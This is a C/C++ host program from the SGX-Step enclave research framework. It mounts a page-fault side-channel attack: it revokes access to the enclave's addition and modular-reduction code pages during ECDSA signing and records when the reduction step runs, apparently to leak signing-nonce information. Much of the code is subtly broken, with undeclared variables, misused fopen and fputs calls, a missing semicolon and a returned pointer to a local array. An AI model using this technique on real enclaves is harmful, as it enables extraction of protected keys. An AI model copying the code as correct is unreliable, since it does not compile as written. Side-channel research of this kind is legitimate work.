/*
 *  This file is part of the SGX-Step enclave execution control framework.
 *
 *  Copyright (C) 2017 Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>,
 *                     Raoul Strackx <raoul.strackx@cs.kuleuven.be>
 *
 *  SGX-Step is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  SGX-Step is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
 */

#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <sys/mman.h>
#include <signal.h>
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/pt.h"
#include <stdbool.h>
#include <time.h>
#include <iostream>
#include <fstream>

unsigned long int Q = 100003;


void *a_pt;
void* ptr;
void* ec_ptr;
void* add_ptr;
void* mod_ptr;
int fault_fired = 0, aep_fired = 0;

bool add_caught = false;
bool mod_caught = false;
bool greater_than_q = false;

void aep_cb_func(void)
{
    uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();
    printf("AEP callback with erip=%#llx. Resuming enclave..\n", erip); 

    aep_fired++;
}

void fault_handler(int signal)
{
    if (!add_caught) {
        printf("Caught fault %d corresponding add operation.\n", signal);
        printf("Restoring add access rights and revoking access to mod_overflow\n");
        add_caught = true;
        ASSERT(!mprotect(add_ptr, 4096, PROT_READ | PROT_WRITE));
        ASSERT(!mprotect(mod_ptr, 4096, PROT_NONE));
        printf("add_restored\n");
        print_pte_adrs(add_ptr);
    } else {
        printf("Caught fault %d corresponding mod_overflow operation.\n", signal);
        printf("Restoring access rights of div_rem\n");
        greater_than_q = true;
        ASSERT(!mprotect(add_ptr, 4096, PROT_READ | PROT_WRITE));
        ASSERT(!mprotect(mod_ptr, 4096, PROT_READ | PROT_WRITE));
        print_pte_adrs(mod_ptr);
    }
    
    fault_fired++;
}

char* random_msg(void) {
  srand((unsigned int)(time(NULL)));
  char msg[21];
  /* help from https://codereview.stackexchange.com/questions/138703/simple-random-password-generator */
  int i;
  for (i = 0; i < 20; i++) {
    msg[i] = 33 + rand() % 94;
  }
  msg[i] = '\0';
  printf("random string is %s\n", msg);
  return &msg;
}

int main( int argc, char **argv )
{
	sgx_launch_token_t token = {0};
	int updated = 0;
    sgx_enclave_id_t eid = 0;

   	printf("Creating enclave...\n");
	SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
                                    &token, &updated, &eid, NULL ) );
    
    register_aep_cb(aep_cb_func);
    register_enclave_info();
    print_enclave_info();

    
    get_Add_ADDR(eid, &add_ptr);
    printf("Address of add %p\n", add_ptr);

    get_Mod_ADDR(eid, &mod_ptr);
    printf("Address of mod %p\n", mod_ptr);

    get_DIVR_ADDR(eid, &ptr);
    printf("Address of DIVR %p\n", ptr);

    ASSERT(!mprotect(add_ptr, 4096, PROT_READ | PROT_WRITE));
    ASSERT(!mprotect(mod_ptr, 4096, PROT_READ | PROT_WRITE));
    
    printf("Will fault on mod_overflow operation once add is called \n");
    print_pte_adrs(mod_ptr);
    // ASSERT(!mprotect(mod_ptr, 4096, PROT_NONE));
    
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);

    /* mprotect to provoke page faults during enclaved execution */

    printf("calling enclave..");

    char sign_array[2] = "ec";
    unsigned long int message_by2 = Q / 2;


    int i;
    unsigned long int return_v = NULL;
    File* data; // http://www.cplusplus.com/doc/tutorial/files/

    time_t timer;
    timer = time(NULL);
    seconds = difftime(timer,mktime(&y2k));
    data = fopen( ("MRQData%.f.txt", seconds), 'r+')

    for (i = 0; i < 1000; i++) {
        ECDSA_sign(eid, &return_v, message_by2);
        printf("Faulting on add operation at %p\n", add_ptr);
        print_pte_adrs(add_ptr);
        ASSERT(!mprotect(add_ptr, 4096, PROT_NONE));

        printf("value of m =q/2 =%lu\n", message_by2);
        printf("value of r =%lu\n", return_v);
        printf("value of q = %lu\n", Q);

        if (greater_than_q) { // if trigger was called twice
            fputs( ("%lu:%lu:%lu\n", message_by_2, return_v, Q), data);
        }

        greater_than_q = false;

    }
    fclose(data);

    ASSERT(fault_fired && aep_fired);
   	SGX_ASSERT( sgx_destroy_enclave( eid ) );

    printf("all is well; exiting..\n");



	return 0;
}

/* OCall functions */
void uprint(const char *str)
{
    /* Proxy/Bridge will check the length and null-terminate 
     * the input string to prevent buffer overflow. 
     */
    printf("%s", str);
    fflush(stdout);
}
